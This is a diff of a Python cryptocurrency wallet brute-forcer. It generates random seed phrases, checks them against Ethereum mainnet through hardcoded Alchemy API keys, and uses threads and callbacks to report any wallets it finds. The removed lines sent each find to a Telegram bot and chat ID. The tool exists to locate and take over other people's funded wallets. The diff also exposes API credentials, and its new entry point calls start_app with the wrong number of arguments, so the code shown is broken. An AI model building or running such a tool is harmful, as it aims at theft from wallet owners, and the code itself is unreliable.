@@ -18,7 +18,8 @@ TELE_CHAT_ID = "5624258194"
 MAX_THREAD = 20
 # Support coin path
 SUPPORT_COIN = None
-
+# Brute thread control
+brute_thread = {}
 # No edit
 wq = queue.Queue()
 
@@ -26,25 +27,6 @@ wq = queue.Queue()
 def gen():
 	mnemo = Mnemonic("english")
 	return mnemo.generate(strength=128)
-
-def init_telegram():
-	global TELE_BOT_TOKEN
-	try:
-		if TELE_BOT_TOKEN == "" or TELE_BOT_TOKEN is None:
-			with open("telegramtoken.txt") as f:
-				TELE_BOT_TOKEN = f.read()
-		url=f"https://api.telegram.org/bot{TELE_BOT_TOKEN}/sendMessage"
-		requests.get(url, params = {"chat_id": TELE_CHAT_ID,"text": "Telegram connect successfully"})
-	except Exception as e:
-		print(e)
-
-def sendToTelegram(w, coin, bl):
-	wq.put(f"{w} | {coin} | {bl}")
-	if TELE_BOT_TOKEN is not None and TELE_BOT_TOKEN != "":
-		data= f"I found it : {w} | {coin} | {bl}"
-		url=f"https://api.telegram.org/bot{TELE_BOT_TOKEN}/sendMessage"
-		requests.get(url, params = {"chat_id": TELE_CHAT_ID,"text":data})
-
 
 def load_config():
 	global MAX_THREAD, TELE_BOT_TOKEN, TELE_CHAT_ID, SUPPORT_COIN
@@ -55,21 +37,25 @@ def load_config():
 		TELE_CHAT_ID = config["TELE_CHAN_ID"]
 		SUPPORT_COIN = config["SUPPORT_COIN"]
 
+def stop_app():
+	pass
 
-if __name__ == '__main__':
+
+def start_app(maxthread, scancoin, logcb, foundcb):
 	# https://eth-mainnet.g.alchemy.com/v2/OatS-qWUFcNjgKNFTrq1m14A9h51mX2N
 	w3 = Web3(Web3.HTTPProvider("https://eth-mainnet.g.alchemy.com/v2/cVoH6Tl8hMagXnCBYRb3cl7wxj7TXbCu"))
 	load_config()
-	init_telegram()
+	# init_telegram()
 	fthread = safefilewriter(wq)
 	fthread.start()
-	brute_thread = {}
-	for i in range(0, MAX_THREAD):
-		brute_thread[i] = walletbrute(sendToTelegram, w3, gen, SUPPORT_COIN)
+	
+	for i in range(0, maxthread):
+		brute_thread[i] = walletbrute(foundcb, w3, gen, scancoin, logcb)
 		brute_thread[i].start()
-	try:
-		# Wait for the termination signal (Ctrl+C)
-		signal.signal(signal.SIGINT, signal.SIG_DFL)
-	except KeyboardInterrupt:
-		print("Stopped")
+	return brute_thread
+
+
+if __name__ == '__main__':
+	start_app(print)
+	
 		
